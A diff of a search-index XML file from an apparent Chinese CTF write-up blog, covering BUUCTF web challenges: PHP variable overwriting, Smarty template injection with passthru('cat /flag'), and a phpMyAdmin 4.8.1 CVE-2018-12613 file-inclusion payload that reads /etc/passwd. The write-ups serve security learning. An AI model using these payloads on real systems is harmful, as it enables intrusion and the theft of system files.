@@ -1,51 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>BJDCTF2020 Mark loves cat</title>
-    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
-    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
-<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
-<h1 id="解题">解题</h1>
-<p>将源码下载后查看了发现了两个 php 文件。</p>
-<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
-<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
-<p>接下来进行代码审计。</p>
-<blockquote>
-<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
-</blockquote>
-<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
-<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
-<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
-<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
-<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
-<ol type="1">
-<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
-<li><code>$yds=$flag</code></li>
-<li>`<code>$is=$flag</code></li>
-</ol>
-<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
-<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
-<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>git泄露</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BJDCTF20 Cookie is so stable</title>
     <url>/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/</url>
     <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
@@ -97,6 +52,82 @@
       </tags>
   </entry>
   <entry>
+    <title>BJDCTF2020 Mark loves cat</title>
+    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
+    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
+<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
+<h1 id="解题">解题</h1>
+<p>将源码下载后查看了发现了两个 php 文件。</p>
+<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
+<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
+<p>接下来进行代码审计。</p>
+<blockquote>
+<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
+</blockquote>
+<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
+<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
+<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
+<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
+<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
+<ol type="1">
+<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
+<li><code>$yds=$flag</code></li>
+<li>`<code>$is=$flag</code></li>
+</ol>
+<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
+<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
+<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>git泄露</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020 The mystery of ip</title>
+    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
+<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
+<h1 id="解题">解题</h1>
+<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
+<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
+<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
+<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
+<p>发现是 <code>smarty</code>。</p>
+<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
+<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
+<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
+<p>成功get。</p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
+<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BSidesCF 2020 Had a bad day</title>
     <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -140,34 +171,45 @@
       </tags>
   </entry>
   <entry>
-    <title>BJDCTF2020 The mystery of ip</title>
-    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
+    <title>GWCTF 2019 我有一个数据库</title>
+    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
 <span id="more"></span>
 <h1 id="题目信息">题目信息</h1>
-<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
-<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
+<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
+<p>因此，决定扫描目录，结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
+<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
 <h1 id="解题">解题</h1>
-<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
-<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
-<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
-<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
-<p>发现是 <code>smarty</code>。</p>
-<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
-<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
-<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
-<p>成功get。</p>
+<p>通过该页面发现：</p>
+<ol type="1">
+<li><p>phpmyadmin 版本为 4.8.1</p></li>
+<li><p>服务器用的是 apache</p></li>
+<li><p>数据库是 mysql</p></li>
+<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
+<li><p>系统为 Ubuntu</p></li>
+</ol>
+<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
+<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
+<p>得到 flag</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
 <h1 id="总结">总结</h1>
-<ul>
-<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
-<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
-</ul>
+<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>SSTI</tag>
+        <tag>phpmyadmin 漏洞</tag>
+        <tag>CVE-2018-12613</tag>
       </tags>
   </entry>
   <entry>
@@ -248,111 +290,6 @@
         <tag>PHP</tag>
         <tag>RCE</tag>
         <tag>nmap命令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GXYCTF2019 禁止套娃</title>
-    <url>/2022/03/24/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后发现什么信息都没有，数据包和源码都没有有用的信息。因此尝试扫描目录。但是我没有扫描出什么结果，可能是脚本不够强大吧。所以我又则疼了一会终于百度了以下，发现存在 <code>git</code> 泄露，因此使用 <code>githack</code> 下载。下载得到源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// 